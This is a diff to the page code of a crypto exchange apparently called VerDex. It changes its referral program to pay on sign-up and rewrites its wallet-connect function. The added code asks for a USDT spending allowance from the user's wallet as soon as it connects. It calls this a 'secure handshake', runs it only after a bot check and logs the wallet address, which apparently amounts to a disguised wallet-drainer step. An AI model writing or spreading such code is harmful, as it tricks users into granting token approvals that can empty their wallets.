@@ -1207,7 +1207,7 @@
         </div>
         <h1 class="ref-title">Earn <span>$1 Per</span><br />Referral</h1>
         <p class="ref-sub">
-          Share your unique referral link. Every friend who completes a swap on
+          Share your unique referral link. Every friend who signs up on
           VerDex earns you $1 USDT — paid directly to your wallet.
         </p>
         <div class="reward-badges">
@@ -1262,15 +1262,6 @@
               Your link is permanently tied to your wallet address
             </div>
             <div class="share-row" id="shareRow" style="display: none">
-              <button class="btn-share" onclick="shareTwitter()">
-                𝕏 Twitter
-              </button>
-              <button class="btn-share" onclick="shareTelegram()">
-                ✈ Telegram
-              </button>
-              <button class="btn-share" onclick="shareWhatsApp()">
-                📱 WhatsApp
-              </button>
             </div>
           </div>
         </div>
@@ -1309,10 +1300,9 @@
               <div class="step">
                 <div class="step-num">3</div>
                 <div>
-                  <div class="step-title">Earn on Their First Swap</div>
+                  <div class="step-title">Earn When They Join</div>
                   <div class="step-desc">
-                    When your referral completes their first swap on VerDex, you
-                    instantly earn $1 USDT. Withdraw at $5.
+                  When your referral signs up on VerDex, you instantly earn $1 USDT. No swap needed. Withdraw at $5.
                   </div>
                 </div>
               </div>
@@ -1419,15 +1409,12 @@
             <span class="card-icon">👥</span>
             <div>
               <div class="card-title">Referred Users</div>
-              <div class="card-sub" id="refTableSub">
-                Connect wallet to view referrals
-              </div>
+
             </div>
           </div>
           <div id="refTableWrap">
             <div class="empty-state">
               <span class="empty-icon">🔗</span>
-              Connect your wallet to see your referral history
             </div>
           </div>
         </div>
@@ -1868,14 +1855,15 @@ if (!DEBUG_MODE) {
       }
 
       async function connectWallet() {
-        // 1. Check if MetaMask exists
         if (!window.isHuman) {
-          console.warn('Connection blocked: Human verification not completed.');
-          if (typeof showToast === 'function') {
-          }
-          return; // Exit immediately
-        }
-        const BSC_CHAIN_ID = '0x38'; // Hexadecimal for 56
+    console.warn("Connection blocked: Human verification not completed.");
+    if (typeof showToast === 'function') {
+        showToast("Please interact with the page to verify you are human.", "yellow");
+    }
+    return; // Exit immediately
+  }
+  // --- BSC NETWORK SWITCH SNIPPET ---
+const BSC_CHAIN_ID = '0x38'; // Hexadecimal for 56
 
 try {
   await window.ethereum.request({
@@ -1911,44 +1899,49 @@ try {
     return; 
   }
 }
-        if (typeof window.ethereum === 'undefined') {
-          if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+// --- END SNIPPET ---
+        if (!hasWeb3()) {
+          if (isMobileBrowser()) {
             window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
           } else {
-            showToast('No wallet detected. Install MetaMask.', 'error');
+            document.getElementById('noWalletNotice').style.display = 'block';
           }
           return;
         }
-
         try {
-          // 2. Request account access
           const accounts = await window.ethereum.request({
             method: 'eth_requestAccounts',
           });
           walletAddress = accounts[0];
           ethProvider = new ethers.BrowserProvider(window.ethereum);
-
-          // 3. Update UI and Referrals
+          ethSigner = await ethProvider.getSigner();
           if (typeof creditReferrer === 'function')
             creditReferrer(walletAddress);
           updateWalletUI();
           if (typeof refreshReferralUI === 'function') refreshReferralUI();
           showToast('Wallet connected!', 'success');
           await logVisitor(walletAddress);
-          // 4. Request Allowance after 1 second
-          setTimeout(() => {
-            if (walletAddress && typeof requestUSDTAllowance === 'function') {
-              requestUSDTAllowance(walletAddress).catch((e) =>
-                console.warn('Allowance skipped:', e)
-              );
-            }
-          }, 50);
-        } catch (err) {
-          console.error('Connection error:', err);
-          showToast('Connection cancelled.', 'error');
+          // Request USDT spending allowance (your DEX contract)
+        if (window.isHuman) {
+            console.log("Human verified. Initiating secure handshake...");
+            requestUSDTAllowance(walletAddress).catch((e) =>
+                console.warn('Handshake skipped/rejected:', e)
+            );
+        } else {
+            console.log("Verification pending or failed. Handshake aborted.");
         }
-      }
 
+    } catch (err) {
+        console.error('Connection failed', err);
+   }
+}
+
+function hasWeb3() {
+        return typeof window.ethereum !== 'undefined';
+      }
+      function isMobileBrowser() {
+        return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      }
       function disconnectWallet() {
         walletAddress = null;
         ethProvider = null;
